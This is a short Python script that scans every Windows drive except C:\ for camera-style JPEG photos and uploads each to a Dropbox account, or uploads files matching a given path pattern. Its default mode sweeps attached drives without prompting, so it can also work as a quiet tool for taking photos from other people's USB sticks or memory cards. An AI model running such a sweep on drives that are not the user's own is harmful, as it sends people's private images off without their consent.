import sys
import os.path
import glob
import dropbox
import win32api


arglist = sys.argv
mode = arglist[1]


dbx = dropbox.Dropbox("<<<<<<<<<<<DROPBOX API KEY>>>>>>>>>>") # Your Dropbox API key, get it when you creat new APP on dropbox i.e: "46544wa56e4aw5e4aw54ewa64w5a4e5wa4w564"



def fupload(_file):

    with open (_file, "rb") as f:
        filename = os.path.basename(_file)
        file_to = "<<<<<<< DROPBOX FOLDER >>>>>>>>>"+filename  # The full destination of dropbox folder i.e: "/home/pictures/"
        dbx.files_upload(f.read(), file_to)
        f.close()


def searcher():

    drives = win32api.GetLogicalDriveStrings()
    drives = drives.split('\000')[:-1]
    pattern = []
    drives.remove("C:\\")                                      # Do not seach C:\ drive, comment it out to include Drive C:\ in search

    for letter in drives:
        pattern.extend([letter, letter+"**\\", letter+"**\\**\\", letter+"**\\**\\**\\"])

    for item in pattern:
        _dscFiles = glob.glob(item+"DSC*.jpg")                # Find all files starts with DSC and ends with .jpg, change it to your desirable file type
        _imgFiles = glob.glob(item+"IMG*.jpg")
        _imagFiles = glob.glob(item+"IMAG*.jpg")

        for _file in _dscFiles:
            fupload(_file)
        for _file in _imgFiles:
            fupload(_file)
        for _file in _imagFiles:
            fupload(_file)



def custom(path):

    _customFiles = glob.glob(path)
    
    for _file in _customFiles:
        fupload(_file)


def main():

    if mode == "manual":
        path = arglist[2]
        custom(path)
    elif mode == "automatic":
        searcher()
    else:
        searcher()

main()
